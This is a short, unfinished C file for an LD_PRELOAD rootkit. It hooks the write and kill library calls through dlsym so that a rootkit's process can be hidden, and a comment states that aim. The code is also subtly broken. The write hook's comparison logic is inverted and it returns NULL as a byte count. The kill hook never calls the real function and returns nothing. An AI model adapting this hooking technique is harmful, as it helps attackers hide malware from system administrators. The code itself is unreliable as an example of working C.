#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>

ssize_t write(int fd, const void *buf, size_t count){
	ssize_t (*new_write) (int fd, const void *buf, size_t count);

	ssize_t result;

/* get pid of rootkit
 use that to match against the write*/

	new_write=dlsym(RTLD_NEXT, "write");
	if(strcmp(buf, "pid")){
		result = NULL;
	}
	else{
		result = new_write(fd,buf,count);
	}
	return result;
}

int kill(pid_t pid, int sig){
	int (*new_kill) (pid_t pid, int sig);

	long result;

	new_kill=dlsym(RTLD_NEXT,"kill");
}

